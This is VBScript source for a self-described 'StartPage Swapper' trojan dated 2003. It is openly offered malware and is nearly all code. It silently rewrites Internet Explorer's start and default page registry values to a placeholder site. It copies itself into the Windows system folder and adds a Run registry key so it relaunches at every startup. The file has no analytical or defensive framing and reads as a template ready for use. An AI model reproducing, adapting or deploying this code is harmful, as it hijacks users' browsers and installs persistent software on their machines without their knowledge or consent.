rem - dlSPS 'DL StartPage Swapper' VBS Trojan By D.L. - Written on: November 4th, 2003

On Error Resume Next
dim FSobj,sysDir,generateSelf,newFile,fixedCode,procreateSelf,newFileData

set FSobj=CreateObject("Scripting.FileSystemObject")
set sysDir = FSobj.GetSpecialFolder(1)

createRegKey "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.YOURSITE.com"
createRegKey "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Default_Page_URL","http://www.YOURSITE.com"
createRegKey "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\dlSPS",sysDir&"\dlSPS.vbs"

set generateSelf=FSobj.CreateTextFile(sysDir+"\dlSPS.vbs")
generateSelf.close

set newFile = FSobj.OpenTextFile(WScript.ScriptFullname,1)
writeCopy()
fixedCode=replace(newFileData,chr(94),"""")

set procreateSelf=FSobj.OpenTextFile(sysDir+"\dlSPS.vbs",2)
procreateSelf.write fixedCode
procreateSelf.close

sub createRegKey(regKey,regVal)
     set regEdit = CreateObject("WScript.Shell")
     regEdit.RegWrite regKey,regVal
end sub

function writeCopy()
     newFileData="rem - ^dlSPS^ by D.L." &vbcrlf& _
     "set FSobj=CreateObject(^Scripting.FileSystemObject^)" &vbcrlf& _
     "set sysDir = FSobj.GetSpecialFolder(1)" &vbcrlf& _
     "createRegKey ^HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page^,^http://www.YOURSITE.com^" &vbcrlf& _
     "createRegKey ^HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Default_Page_URL^,^http://www.YOURSITE.com^" &vbcrlf& _
     "createRegKey ^HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\dlSPS^,sysDir&^\dlSPS.vbs^" &vbcrlf& _
     "sub createRegKey(regKey,regVal)" &vbcrlf& _
     "set regEdit = CreateObject(^WScript.Shell^)" &vbcrlf& _
     "regEdit.RegWrite regKey,regVal" &vbcrlf& _
     "end sub"
end function
